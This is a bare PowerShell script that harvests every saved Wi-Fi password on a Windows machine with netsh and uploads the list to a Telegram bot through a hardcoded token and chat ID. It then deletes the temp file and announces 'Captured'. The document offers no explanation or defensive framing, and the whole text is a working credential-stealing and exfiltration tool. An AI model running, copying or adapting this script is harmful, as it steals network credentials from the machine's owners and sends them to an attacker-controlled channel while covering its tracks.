$t = "8055439877:AAHqPyyYm79putLyxCDa3bED7KHTdWo1T80"
$i = "8597805144"
$p = "$env:TEMP\w.txt"
$w = netsh wlan show profiles | Select-String "\:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
foreach ($n in $w) {
    $c = netsh wlan show profile name="$n" key=clear
    $m = $c | Select-String "Key Content\W+\:(.+)$"
    if ($m) {
        $pass = $m.Matches.Groups[1].Value.Trim()
        Add-Content -Path $p -Value "$n : $pass"
    }
}
if (Test-Path $p) {
    curl.exe -L -F "document=@$p" "https://api.telegram.org/bot$t/sendDocument?chat_id=$i"
    Remove-Item $p -Force
}
(New-Object -ComObject SAPI.SpVoice).Speak("Captured")
